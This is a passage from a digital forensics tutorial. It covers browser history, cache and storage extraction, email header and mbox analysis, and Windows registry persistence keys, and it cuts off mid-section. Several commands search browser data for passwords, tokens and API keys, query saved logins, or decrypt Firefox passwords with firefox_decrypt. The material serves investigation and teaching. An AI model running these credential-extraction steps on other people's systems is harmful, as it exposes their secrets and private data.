            f.write(f"BROWSING HISTORY ({len(self.results['history'])} entries)\n")
            f.write("-" * 80 + "\n")
            for entry in self.results['history'][:50]:  # Top 50
                f.write(f"Browser: {entry['browser']}\n")
                f.write(f"Time: {entry['timestamp']}\n")
                f.write(f"URL: {entry['url']}\n")
                f.write(f"Title: {entry['title']}\n")
                f.write(f"Visit Count: {entry['visit_count']}\n\n")
            
            # Downloads
            f.write(f"\nDOWNLOAD HISTORY ({len(self.results['downloads'])} entries)\n")
            f.write("-" * 80 + "\n")
            for entry in self.results['downloads']:
                f.write(f"Browser: {entry['browser']}\n")
                f.write(f"Time: {entry['timestamp']}\n")
                f.write(f"File: {entry['path']}\n")
                if 'url' in entry:
                    f.write(f"Source: {entry['url']}\n")
                f.write("\n")
            
            # Searches
            if self.results['searches']:
                f.write(f"\nSEARCH QUERIES ({len(self.results['searches'])} entries)\n")
                f.write("-" * 80 + "\n")
                for entry in self.results['searches'][:100]:
                    f.write(f"Browser: {entry['browser']}\n")
                    f.write(f"Query: {entry['term']}\n\n")
        
        # Save JSON
        json_file = output_file.replace('.txt', '.json')
        with open(json_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"[+] Text report: {output_file}")
        print(f"[+] JSON report: {json_file}")
        
        # Statistics
        print(f"\n[+] Statistics:")
        print(f"    History entries: {len(self.results['history'])}")
        print(f"    Downloads: {len(self.results['downloads'])}")
        print(f"    Searches: {len(self.results['searches'])}")

if __name__ == "__main__":
    from datetime import timedelta
    
    forensics = BrowserForensics()
    
    # Analyze Chrome
    chrome_path = os.path.expanduser('~/.config/google-chrome/Default')
    if os.path.exists(chrome_path):
        forensics.analyze_chrome(chrome_path)
    
    # Analyze Firefox
    firefox_profile_dir = os.path.expanduser('~/.mozilla/firefox')
    if os.path.exists(firefox_profile_dir):
        for profile in os.listdir(firefox_profile_dir):
            profile_path = os.path.join(firefox_profile_dir, profile)
            if os.path.isdir(profile_path) and 'places.sqlite' in os.listdir(profile_path):
                forensics.analyze_firefox(profile_path)
    
    # Generate report
    forensics.generate_report('/tmp/browser_forensics_report.txt')
```

### Cache Analysis

**Chrome Cache Extraction**

```bash
# Cache location
~/.config/google-chrome/Default/Cache/Cache_Data/

# List cache files
ls -lh ~/.config/google-chrome/Default/Cache/Cache_Data/

# Extract readable content from cache
strings ~/.config/google-chrome/Default/Cache/Cache_Data/* | less

# Find specific content
strings ~/.config/google-chrome/Default/Cache/Cache_Data/* | grep -i "password\|api_key\|token"

# Extract images from cache
find ~/.config/google-chrome/Default/Cache/Cache_Data/ -type f | while read file; do
    if file "$file" | grep -q "image"; then
        cp "$file" "/tmp/cache_images/$(basename $file).jpg"
    fi
done
```

**Chrome Cache Viewer**

```bash
# Using ChromeCacheView (Windows/Wine)
# Download from NirSoft

# Linux alternative - manual parsing
python3 << EOF
import os
import hashlib

cache_dir = os.path.expanduser('~/.config/google-chrome/Default/Cache/Cache_Data/')

for filename in os.listdir(cache_dir):
    filepath = os.path.join(cache_dir, filename)
    
    with open(filepath, 'rb') as f:
        data = f.read(1024)  # First 1KB
        
        # Try to identify file type
        if data.startswith(b'\xFF\xD8\xFF'):
            print(f"JPEG: {filename}")
        elif data.startswith(b'\x89PNG'):
            print(f"PNG: {filename}")
        elif b'<html' in data.lower() or b'<!doctype' in data.lower():
            print(f"HTML: {filename}")
EOF
```

### Session and Local Storage Analysis

**Extract LocalStorage (Chrome)**

```bash
# LocalStorage location
~/.config/google-chrome/Default/Local Storage/leveldb/

# LevelDB files contain key-value pairs
strings ~/.config/google-chrome/Default/Local\ Storage/leveldb/* | less

# Search for specific data
strings ~/.config/google-chrome/Default/Local\ Storage/leveldb/* | grep -i "token\|session\|user"

# Using Python to parse LevelDB
pip install leveldb

python3 << EOF
import leveldb
import os

db_path = os.path.expanduser('~/.config/google-chrome/Default/Local Storage/leveldb/')
db = leveldb.LevelDB(db_path)

for key, value in db.RangeIter():
    try:
        print(f"Key: {key.decode('utf-8', errors='ignore')}")
        print(f"Value: {value.decode('utf-8', errors='ignore')}\n")
    except:
        pass
EOF
```

**SessionStorage Analysis**

```bash
# SessionStorage is in memory but can be extracted from:
~/.config/google-chrome/Default/Session Storage/

# Similar to LocalStorage analysis
strings ~/.config/google-chrome/Default/Session\ Storage/* | grep -i "session\|auth"
```

### Form Autofill and Password Analysis

**Extract Autofill Data**

```bash
sqlite3 ~/.config/google-chrome/Default/"Web Data"

# View autofill entries
SELECT name, value, count
FROM autofill
ORDER BY count DESC;

# Extract email addresses
SELECT value
FROM autofill
WHERE name LIKE '%email%' OR name LIKE '%mail%';

# Extract phone numbers
SELECT value
FROM autofill
WHERE name LIKE '%phone%' OR name LIKE '%tel%';

# Extract addresses
SELECT name, value
FROM autofill
WHERE name LIKE '%address%' OR name LIKE '%street%' OR name LIKE '%city%';
```

**Password Database Analysis**

**[Inference]** Browsers encrypt stored passwords. Extraction requires decryption keys or master password.

```bash
# Chrome Login Data location
~/.config/google-chrome/Default/"Login Data"

sqlite3 ~/.config/google-chrome/Default/"Login Data"

# View password entries (encrypted)
SELECT origin_url, username_value, password_value, date_created
FROM logins;

# Passwords are encrypted - requires decryption key
# Chrome uses OS keyring (GNOME Keyring on Linux)
```

**Firefox Password Extraction**

```bash
# Firefox stores passwords in logins.json (encrypted)
cat ~/.mozilla/firefox/<profile>/logins.json | python3 -m json.tool

# Requires key4.db for decryption
# Use firefox_decrypt tool

git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt
python firefox_decrypt.py ~/.mozilla/firefox/<profile>/

# Enter master password if set
```

## Email Forensics

Email forensics involves analyzing email headers, content, attachments, and metadata to investigate phishing, trace senders, and recover evidence.

### Email Header Analysis

**Email Header Structure**

```
Return-Path: <sender@example.com>
Delivered-To: recipient@example.com
Received: from mail.example.com (mail.example.com [192.168.1.1])
    by mx.google.com with SMTP id abc123
    for <recipient@example.com>;
    Sat, 26 Oct 2024 10:30:45 -0700 (PDT)
From: Sender Name <sender@example.com>
To: recipient@example.com
Subject: Important Message
Date: Sat, 26 Oct 2024 10:30:00 -0700
Message-ID: <unique-id@example.com>
MIME-Version: 1.0
Content-Type: text/html; charset="UTF-8"
X-Originating-IP: [192.168.1.100]
Authentication-Results: spf=pass smtp.mailfrom=example.com;
    dkim=pass header.d=example.com;
    dmarc=pass
```

**Manual Header Analysis**

```bash
# View raw email headers in mail clients:
# Gmail: Show original
# Outlook: View > Message Source
# Thunderbird: View > Message Source

# Extract email header from .eml file
cat email.eml | head -n 50

# Extract specific headers
grep "^Received:" email.eml
grep "^From:" email.eml
grep "^X-Originating-IP:" email.eml

# Trace email path (Received headers in reverse order)
grep "^Received:" email.eml | tac
```

**Automated Header Analysis Tools**

**Email Header Analyzer Script**

```python
#!/usr/bin/env python3
import email
import sys
import re
from datetime import datetime
import json

def analyze_email_headers(eml_file):
    """Analyze email headers for forensics"""
    
    with open(eml_file, 'r', encoding='utf-8', errors='ignore') as f:
        msg = email.message_from_file(f)
    
    analysis = {
        'basic_info': {},
        'routing': [],
        'authentication': {},
        'suspicious_indicators': []
    }
    
    # Basic Information
    analysis['basic_info'] = {
        'from': msg.get('From', 'Unknown'),
        'to': msg.get('To', 'Unknown'),
        'subject': msg.get('Subject', 'No Subject'),
        'date': msg.get('Date', 'Unknown'),
        'message_id': msg.get('Message-ID', 'Unknown'),
        'reply_to': msg.get('Reply-To', msg.get('From', 'Unknown'))
    }
    
    # Extract routing information (Received headers)
    received_headers = msg.get_all('Received', [])
    for i, received in enumerate(reversed(received_headers)):
        hop = {
            'hop_number': i + 1,
            'header': received
        }
        
        # Extract IP addresses
        ips = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', received)
        if ips:
            hop['ips'] = ips
        
        # Extract hostnames
        hostnames = re.findall(r'from\s+([^\s]+)', received, re.IGNORECASE)
        if hostnames:
            hop['from_host'] = hostnames[0]
        
        analysis['routing'].append(hop)
    
    # Authentication Results
    auth_results = msg.get('Authentication-Results', '')
    
    # SPF
    spf_match = re.search(r'spf=(\w+)', auth_results, re.IGNORECASE)
    if spf_match:
        analysis['authentication']['spf'] = spf_match.group(1)
    
    # DKIM
    dkim_match = re.search(r'dkim=(\w+)', auth_results, re.IGNORECASE)
    if dkim_match:
        analysis['authentication']['dkim'] = dkim_match.group(1)
    
    # DMARC
    dmarc_match = re.search(r'dmarc=(\w+)', auth_results, re.IGNORECASE)
    if dmarc_match:
        analysis['authentication']['dmarc'] = dmarc_match.group(1)
    
    # Originating IP
    x_originating_ip = msg.get('X-Originating-IP', '')
    if x_originating_ip:
        analysis['basic_info']['originating_ip'] = x_originating_ip.strip('[]')
    
    # Suspicious Indicators
    
    # Check for mismatched From/Reply-To
    if analysis['basic_info']['from'] != analysis['basic_info']['reply_to']:
        analysis['suspicious_indicators'].append(
            f"Mismatched From and Reply-To headers"
        )
    
    # Check for failed authentication
    if analysis['authentication'].get('spf') == 'fail':
        analysis['suspicious_indicators'].append("SPF authentication failed")
    if analysis['authentication'].get('dkim') == 'fail':
        analysis['suspicious_indicators'].append("DKIM authentication failed")
    if analysis['authentication'].get('dmarc') == 'fail':
        analysis['suspicious_indicators'].append("DMARC authentication failed")
    
    # Check for suspicious keywords in subject
    phishing_keywords = ['urgent', 'verify', 'suspended', 'confirm', 'account', 'password']
    subject_lower = analysis['basic_info']['subject'].lower()
    for keyword in phishing_keywords:
        if keyword in subject_lower:
            analysis['suspicious_indicators'].append(f"Phishing keyword in subject: '{keyword}'")
            break
    
    return analysis

def print_analysis(analysis):
    """Print formatted analysis"""
    
    print("=" * 80)
    print("EMAIL HEADER FORENSIC ANALYSIS")
    print("=" * 80)
    
    print("\n[+] BASIC INFORMATION")
    print("-" * 80)
    for key, value in analysis['basic_info'].items():
        print(f"{key.upper()}: {value}")
    
    print("\n[+] EMAIL ROUTING")
    print("-" * 80)
    for hop in analysis['routing']:
        print(f"\nHop {hop['hop_number']}:")
        if 'from_host' in hop:
            print(f"  From Host: {hop['from_host']}")
        if 'ips' in hop:
            print(f"  IP Addresses: {', '.join(hop['ips'])}")
    
    print("\n[+] AUTHENTICATION")
    print("-" * 80)
    for key, value in analysis['authentication'].items():
        print(f"{key.upper()}: {value}")
    
    if analysis['suspicious_indicators']:
        print("\n[!] SUSPICIOUS INDICATORS")
        print("-" * 80)
        for indicator in analysis['suspicious_indicators']:
            print(f"  - {indicator}")
    else:
        print("\n[+] No suspicious indicators found")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <email.eml>")
        sys.exit(1)
    
    eml_file = sys.argv[1]
    
    print(f"[*] Analyzing {eml_file}...\n")
    analysis = analyze_email_headers(eml_file)
    print_analysis(analysis)
    
    # Save JSON output
    json_file = eml_file.replace('.eml', '_analysis.json')
    with open(json_file, 'w') as f:
        json.dump(analysis, f, indent=2)
    print(f"\n[+] JSON output saved to: {json_file}")
```

### Email Client Forensics

**Thunderbird Email Forensics**

```bash
# Thunderbird profile location
~/.thunderbird/<profile>/

# Key files
~/.thunderbird/<profile>/Mail/           # Mail folders (mbox format)
~/.thunderbird/<profile>/ImapMail/       # IMAP cache
~/.thunderbird/<profile>/global-messages-db.sqlite  # Message index
~/.thunderbird/<profile>/cookies.sqlite  # Cookies
~/.thunderbird/<profile>/logins.json     # Saved passwords
~/.thunderbird/<profile>/prefs.js        # Preferences
~/.thunderbird/<profile>/key4.db         # Encryption key

# Windows location
C:\Users\<username>\AppData\Roaming\Thunderbird\Profiles\<profile>\

# List email folders
ls -lh ~/.thunderbird/<profile>/Mail/Local\ Folders/

# View mbox file (plain text)
cat ~/.thunderbird/<profile>/Mail/Local\ Folders/Inbox

# Extract email addresses from mbox
grep -Eo "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b" Inbox | sort -u

# Count emails in mbox
grep -c "^From " Inbox

# Search for keywords in emails
grep -i "password\|confidential\|secret" Inbox
```

**Thunderbird Database Analysis**

```bash
# Analyze global-messages-db.sqlite
sqlite3 ~/.thunderbird/<profile>/global-messages-db.sqlite

# List tables
.tables

# View schema
.schema messagesText

# Search email content
SELECT subject, body
FROM messagesText
WHERE body LIKE '%keyword%'
LIMIT 10;

# Extract sender statistics
SELECT sender, COUNT(*) as count
FROM messagesText
GROUP BY sender
ORDER BY count DESC
LIMIT 20;

# Find emails with attachments
SELECT subject, sender
FROM messagesText
WHERE subject LIKE '%attachment%' OR body LIKE '%attached%';
```

**Microsoft Outlook Forensics (PST/OST Files)**

**[Inference]** PST (Personal Storage Table) and OST (Offline Storage Table) files contain Outlook email data but use proprietary format requiring specialized tools.

```bash
# PST file locations (Windows)
C:\Users\<username>\Documents\Outlook Files\
C:\Users\<username>\AppData\Local\Microsoft\Outlook\

# Install readpst (PST reader for Linux)
apt install pst-utils

# Convert PST to mbox format
readpst -o /tmp/outlook_export/ outlook.pst

# Convert PST to individual files
readpst -S -D -r -o /tmp/outlook_export/ outlook.pst

# Parameters:
# -S: Separate emails into individual files
# -D: Include deleted items
# -r: Recursive
# -o: Output directory

# Export as EML files
readpst -e -D -r -o /tmp/outlook_export/ outlook.pst

# Extract email addresses from PST
readpst -S outlook.pst | grep -Eo "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b" | sort -u
```

**libpff (Advanced PST Analysis)**

```bash
# Install libpff
git clone https://github.com/libyal/libpff.git
cd libpff
./synclibs.sh
./autogen.sh
./configure
make
sudo make install

# Display PST information
pffinfo outlook.pst

# Export PST items
pffexport -f text -t /tmp/pst_export outlook.pst

# Export to mbox
pffexport -f mbox -t /tmp/pst_export outlook.pst

# Extract attachments
pffexport -f all -m all -t /tmp/pst_export outlook.pst
```

### MBOX File Analysis

**Python MBOX Parser**

```python
#!/usr/bin/env python3
import mailbox
import sys
import email
from email.utils import parsedate_to_datetime
import re
from collections import defaultdict

def analyze_mbox(mbox_file):
    """Analyze mbox file for forensics"""
    
    mbox = mailbox.mbox(mbox_file)
    
    statistics = {
        'total_emails': 0,
        'senders': defaultdict(int),
        'recipients': defaultdict(int),
        'domains': defaultdict(int),
        'attachments': [],
        'suspicious_emails': [],
        'date_range': {'earliest': None, 'latest': None}
    }
    
    print(f"[*] Analyzing {mbox_file}...")
    
    for message in mbox:
        statistics['total_emails'] += 1
        
        # Extract sender
        sender = message.get('From', '')
        if sender:
            statistics['senders'][sender] += 1
            
            # Extract domain
            domain_match = re.search(r'@([a-zA-Z0-9.-]+)', sender)
            if domain_match:
                statistics['domains'][domain_match.group(1)] += 1
        
        # Extract recipients
        to = message.get('To', '')
        if to:
            recipients = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', to)
            for recipient in recipients:
                statistics['recipients'][recipient] += 1
        
        # Extract date
        date_str = message.get('Date', '')
        if date_str:
            try:
                date = parsedate_to_datetime(date_str)
                if statistics['date_range']['earliest'] is None or date < statistics['date_range']['earliest']:
                    statistics['date_range']['earliest'] = date
                if statistics['date_range']['latest'] is None or date > statistics['date_range']['latest']:
                    statistics['date_range']['latest'] = date
            except:
                pass
        
        # Check for attachments
        if message.is_multipart():
            for part in message.walk():
                filename = part.get_filename()
                if filename:
                    statistics['attachments'].append({
                        'filename': filename,
                        'sender': sender,
                        'subject': message.get('Subject', 'No Subject'),
                        'date': date_str
                    })
        
        # Check for suspicious indicators
        subject = message.get('Subject', '').lower()
        body = ''
        
        if message.is_multipart():
            for part in message.walk():
                if part.get_content_type() == "text/plain":
                    body = part.get_payload(decode=True).decode('utf-8', errors='ignore').lower()
                    break
        else:
            body = message.get_payload(decode=True)
            if body:
                body = body.decode('utf-8', errors='ignore').lower()
        
        # Phishing indicators
        phishing_keywords = ['urgent', 'verify', 'suspended', 'confirm your', 'update your', 
                            'click here', 'account will be', 'unusual activity']
        
        for keyword in phishing_keywords:
            if keyword in subject or (body and keyword in body):
                statistics['suspicious_emails'].append({
                    'subject': message.get('Subject', 'No Subject'),
                    'sender': sender,
                    'date': date_str,
                    'reason': f"Contains keyword: '{keyword}'"
                })
                break
        
        # Check for URL mismatches
        if body:
            urls = re.findall(r'https?://[^\s<>"\']+', body)
            if urls:
                # Check if display text differs from actual URL
                link_pattern = r'<a[^>]+href=["\']([^"\']+)["\'][^>]*>([^<]+)</a>'
                links = re.findall(link_pattern, body, re.IGNORECASE)
                
                for href, text in links:
                    if 'http' in text.lower() and href != text:
                        statistics['suspicious_emails'].append({
                            'subject': message.get('Subject', 'No Subject'),
                            'sender': sender,
                            'date': date_str,
                            'reason': f"URL mismatch: Display '{text}' vs Actual '{href}'"
                        })
                        break
    
    mbox.close()
    return statistics

def print_statistics(statistics):
    """Print formatted statistics"""
    
    print("\n" + "=" * 80)
    print("MBOX FORENSIC ANALYSIS")
    print("=" * 80)
    
    print(f"\n[+] Total Emails: {statistics['total_emails']}")
    
    if statistics['date_range']['earliest'] and statistics['date_range']['latest']:
        print(f"[+] Date Range: {statistics['date_range']['earliest']} to {statistics['date_range']['latest']}")
    
    # Top senders
    print(f"\n[+] TOP 10 SENDERS")
    print("-" * 80)
    for sender, count in sorted(statistics['senders'].items(), key=lambda x: x[1], reverse=True)[:10]:
        print(f"  {count:4d} - {sender}")
    
    # Top recipients
    print(f"\n[+] TOP 10 RECIPIENTS")
    print("-" * 80)
    for recipient, count in sorted(statistics['recipients'].items(), key=lambda x: x[1], reverse=True)[:10]:
        print(f"  {count:4d} - {recipient}")
    
    # Top domains
    print(f"\n[+] TOP SENDER DOMAINS")
    print("-" * 80)
    for domain, count in sorted(statistics['domains'].items(), key=lambda x: x[1], reverse=True)[:10]:
        print(f"  {count:4d} - {domain}")
    
    # Attachments
    if statistics['attachments']:
        print(f"\n[+] ATTACHMENTS ({len(statistics['attachments'])} total)")
        print("-" * 80)
        for attachment in statistics['attachments'][:20]:
            print(f"  File: {attachment['filename']}")
            print(f"  From: {attachment['sender']}")
            print(f"  Subject: {attachment['subject']}")
            print(f"  Date: {attachment['date']}\n")
    
    # Suspicious emails
    if statistics['suspicious_emails']:
        print(f"\n[!] SUSPICIOUS EMAILS ({len(statistics['suspicious_emails'])} found)")
        print("-" * 80)
        for email in statistics['suspicious_emails'][:20]:
            print(f"  Subject: {email['subject']}")
            print(f"  From: {email['sender']}")
            print(f"  Date: {email['date']}")
            print(f"  Reason: {email['reason']}\n")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <mbox_file>")
        sys.exit(1)
    
    mbox_file = sys.argv[1]
    statistics = analyze_mbox(mbox_file)
    print_statistics(statistics)
```

### Attachment Extraction and Analysis

**Extract Attachments from EML**

```python
#!/usr/bin/env python3
import email
import sys
import os

def extract_attachments(eml_file, output_dir):
    """Extract attachments from EML file"""
    
    with open(eml_file, 'rb') as f:
        msg = email.message_from_binary_file(f)
    
    os.makedirs(output_dir, exist_ok=True)
    
    attachment_count = 0
    
    for part in msg.walk():
        if part.get_content_maintype() == 'multipart':
            continue
        
        filename = part.get_filename()
        
        if filename:
            attachment_count += 1
            filepath = os.path.join(output_dir, filename)
            
            # Handle duplicate filenames
            if os.path.exists(filepath):
                base, ext = os.path.splitext(filename)
                counter = 1
                while os.path.exists(filepath):
                    filepath = os.path.join(output_dir, f"{base}_{counter}{ext}")
                    counter += 1
            
            with open(filepath, 'wb') as f:
                f.write(part.get_payload(decode=True))
            
            print(f"[+] Extracted: {filename}")
            print(f"    Size: {os.path.getsize(filepath)} bytes")
            print(f"    Content-Type: {part.get_content_type()}")
            print(f"    Saved to: {filepath}\n")
    
    if attachment_count == 0:
        print("[-] No attachments found")
    else:
        print(f"[+] Total attachments extracted: {attachment_count}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <email.eml> <output_directory>")
        sys.exit(1)
    
    extract_attachments(sys.argv[1], sys.argv[2])
```

**Analyze Extracted Attachments**

```bash
# Calculate file hashes
find /tmp/attachments/ -type f -exec sha256sum {} \;

# Check against VirusTotal
for file in /tmp/attachments/*; do
    hash=$(sha256sum "$file" | cut -d' ' -f1)
    echo "File: $file"
    echo "SHA256: $hash"
    curl -s "https://www.virustotal.com/vtapi/v2/file/report?apikey=YOUR_API_KEY&resource=$hash"
    echo ""
done

# File type identification
file /tmp/attachments/*

# Extract strings from attachments
strings /tmp/attachments/suspicious_file.exe

# Check for macros in Office documents
olevba /tmp/attachments/document.docx

# Extract URLs from files
grep -r -Eo "https?://[^\s<>\"']+" /tmp/attachments/
```

### Email Network Analysis

**Visualize Email Relationships**

```python
#!/usr/bin/env python3
import mailbox
import sys
import re
from collections import defaultdict
import json

def build_email_network(mbox_file):
    """Build network graph of email communications"""
    
    mbox = mailbox.mbox(mbox_file)
    
    network = {
        'nodes': set(),
        'edges': defaultdict(int)
    }
    
    for message in mbox:
        sender = message.get('From', '')
        
        # Extract email address from "Name <email>" format
        sender_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[A-Z|a-z]{2,})', sender)
        if sender_match:
            sender_email = sender_match.group(1).lower()
        else:
            continue
        
        network['nodes'].add(sender_email)
        
        # Extract recipients
        to = message.get('To', '')
        cc = message.get('Cc', '')
        
        all_recipients = to + ',' + cc
        recipients = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[A-Z|a-z]{2,})', all_recipients)
        
        for recipient in recipients:
            recipient_email = recipient.lower()
            network['nodes'].add(recipient_email)
            
            # Create edge (sender -> recipient)
            edge = (sender_email, recipient_email)
            network['edges'][edge] += 1
    
    mbox.close()
    
    # Convert to JSON-serializable format
    network['nodes'] = list(network['nodes'])
    network['edges'] = [
        {'source': edge[0], 'target': edge[1], 'weight': count}
        for edge, count in network['edges'].items()
    ]
    
    return network

def print_network_stats(network):
    """Print network statistics"""
    
    print(f"[+] Network Statistics")
    print(f"    Nodes (email addresses): {len(network['nodes'])}")
    print(f"    Edges (communications): {len(network['edges'])}")
    
    # Most active communicators
    sender_count = defaultdict(int)
    recipient_count = defaultdict(int)
    
    for edge in network['edges']:
        sender_count[edge['source']] += edge['weight']
        recipient_count[edge['target']] += edge['weight']
    
    print(f"\n[+] Most Active Senders:")
    for sender, count in sorted(sender_count.items(), key=lambda x: x[1], reverse=True)[:10]:
        print(f"    {count:4d} - {sender}")
    
    print(f"\n[+] Most Contacted Recipients:")
    for recipient, count in sorted(recipient_count.items(), key=lambda x: x[1], reverse=True)[:10]:
        print(f"    {count:4d} - {recipient}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <mbox_file>")
        sys.exit(1)
    
    print("[*] Building email network...")
    network = build_email_network(sys.argv[1])
    
    print_network_stats(network)
    
    # Save network data
    output_file = 'email_network.json'
    with open(output_file, 'w') as f:
        json.dump(network, f, indent=2)
    
    print(f"\n[+] Network data saved to: {output_file}")
    print("[*] Import into Gephi, Cytoscape, or similar for visualization")
```

## Registry Forensics

Windows Registry forensics involves analyzing registry hives to identify persistence mechanisms, user activity, system configuration, and evidence of compromise.

### Registry Hive Locations

**Windows Registry Structure**

```
HKEY_LOCAL_MACHINE (HKLM)
â”œâ”€â”€ SAM         - Security Accounts Manager
â”œâ”€â”€ SECURITY    - Security policies
â”œâ”€â”€ SOFTWARE    - Installed software
â”œâ”€â”€ SYSTEM      - System configuration
â””â”€â”€ HARDWARE    - Hardware configuration (volatile)

HKEY_CURRENT_USER (HKCU)
â”œâ”€â”€ Software    - User software settings
â”œâ”€â”€ Environment - User environment variables
â””â”€â”€ Network     - Network connections

HKEY_USERS (HKU)
â””â”€â”€ <SID>       - User-specific settings

HKEY_CURRENT_CONFIG (HKCC)
â””â”€â”€ Current hardware profile

HKEY_CLASSES_ROOT (HKCR)
â””â”€â”€ File associations and COM objects
```

**Registry Hive File Locations**

```bash
# Live system (Windows)
C:\Windows\System32\config\
â”œâ”€â”€ SAM           # User accounts and passwords
â”œâ”€â”€ SECURITY      # Security policies
â”œâ”€â”€ SOFTWARE      # System software settings
â”œâ”€â”€ SYSTEM        # System configuration
â””â”€â”€ DEFAULT       # Default user profile

# User hives
C:\Users\<username>\NTUSER.DAT              # User registry
C:\Users\<username>\AppData\Local\Microsoft\Windows\UsrClass.dat  # User classes

# Transaction logs
C:\Windows\System32\config\*.LOG
C:\Windows\System32\config\*.LOG1
C:\Windows\System32\config\*.LOG2

# Backup hives
C:\Windows\System32\config\RegBack\

# System Restore Points
C:\System Volume Information\_restore{GUID}\RPx\snapshot\
```

### Registry Analysis Tools (Linux)

**reglookup (Registry Parser)**

```bash
# Install reglookup
apt install reglookup

# Parse registry hive
reglookup SYSTEM

# Search for specific key
reglookup -p 'ControlSet001/Services' SYSTEM

# Export to CSV
reglookup -t VALUE SYSTEM > system_values.csv

# Search for specific value
reglookup SOFTWARE | grep -i "microsoft"

# Get only specific value types
reglookup -t REG_SZ SOFTWARE

# Available types:
# REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_MULTI_SZ
```

**regripper (Registry Analysis Framework)**

```bash
# Install regripper
git clone https://github.com/keydet89/RegRipper3.0.git
cd RegRipper3.0

# Run specific plugin
perl rip.pl -r /path/to/SYSTEM -p services

# Run all plugins
perl rip.pl -r /path/to/SOFTWARE -a

# Common plugins:
# - userassist: User activity tracking
# - run: Autostart entries
# - services: Installed services
# - uninstall: Installed programs
# - networks: Network history
# - usb: USB device history

# Analyze NTUSER.DAT
perl rip.pl -r /path/to/NTUSER.DAT -p userassist

# Generate report
perl rip.pl -r /path/to/SYSTEM -a > system_analysis.txt
```

**Registry Parser Script (Python)**

```python
#!/usr/bin/env python3
from Registry import Registry
import sys
import datetime

def analyze_registry_hive(hive_path):
    """Analyze Windows registry hive"""
    
    try:
        reg = Registry.Registry(hive_path)
    except Exception as e:
        print(f"[-] Error opening registry hive: {e}")
        return
    
    print(f"[+] Analyzing: {hive_path}")
    print(f"[+] Root key: {reg.root().name()}")
    print("=" * 80)
    
    # Example: Extract Run keys (autostart)
    try:
        run_key = reg.open("Microsoft\\Windows\\CurrentVersion\\Run")
        print("\n[+] AUTOSTART ENTRIES (Run)")
        print("-" * 80)
        
        for value in run_key.values():
            print(f"Name: {value.name()}")
            print(f"Data: {value.value()}")
            print(f"Type: {value.value_type_str()}\n")
    except Registry.RegistryKeyNotFoundException:
        print("[-] Run key not found")
    
    # Extract installed software
    try:
        uninstall_key = reg.open("Microsoft\\Windows\\CurrentVersion\\Uninstall")
        print("\n[+] INSTALLED SOFTWARE")
        print("-" * 80)
        
        for subkey in uninstall_key.subkeys():
            try:
                name = subkey.value("DisplayName").value()
                version = subkey.value("DisplayVersion").value()
                print(f"{name} - Version {version}")
            except:
                pass
    except Registry.RegistryKeyNotFoundException:
        pass

def extract_userassist(ntuser_path):
    """Extract UserAssist data (program execution history)"""
    
    try:
        reg = Registry.Registry(ntuser_path)
    except Exception as e:
        print(f"[-] Error: {e}")
        return
    
    print("\n[+] USERASSIST DATA (Program Execution)")
    print("=" * 80)
    
    try:
        userassist_key = reg.open("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist")
        
        for guid_key in userassist_key.subkeys():
            print(f"\nGUID: {guid_key.name()}")
            
            try:
                count_key = guid_key.subkey("Count")
                
                for value in count_key.values():
                    # ROT13 decode name
                    name = value.name()
                    decoded_name = name.encode().decode('rot13')
                    
                    print(f"  Program: {decoded_name}")
                    
                    # Parse binary data (contains execution count and timestamp)
                    data = value.value()
                    if len(data) >= 72:
                        # Extract execution count (offset 4, DWORD)
                        exec_count = int.from_bytes(data[4:8], 'little')
                        print(f"    Execution Count: {exec_count}")
                        
                        # Extract last execution time (offset 60, FILETIME)
                        filetime = int.from_bytes(data[60:68], 'little')
                        if filetime > 0:
                            # Convert FILETIME to datetime
                            timestamp = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=filetime/10)
                            print(f"    Last Executed: {timestamp}")
                    
                    print()
            except Registry.RegistryKeyNotFoundException:
                pass
    except Registry.RegistryKeyNotFoundException:
        print("[-] UserAssist key not found")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <registry_hive>")
        sys.exit(1)
    
    hive_path = sys.argv[1]
    
    # Determine hive type from filename
    if 'NTUSER' in hive_path.upper():
        extract_userassist(hive_path)
    else:
        analyze_registry_hive(hive_path)
```

### Key Forensic Registry Locations

**Autostart/Persistence Locations**

```bash
# HKLM Run keys
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce

# HKCU Run keys
Software\Microsoft\Windows\CurrentVersion\Run
Software\Microsoft\Windows\CurrentVersion\RunOnce

# Winlogon
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
# Look for: Userinit, Shell, Notify, TaskMan

# Services
SYSTEM\CurrentControlSet\Services
# Each service has ImagePath (executable location)

# Scheduled Tasks (Task Scheduler)
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks

# Startup Folder
SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
# StartUp value points to startup folder location

# AppInit_DLLs (DLL injection)
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs

# Browser Helper Objects (BHO)
SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects

# Group Policy Scripts
SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts
```

**Network Activity**

```bash
# Network interfaces
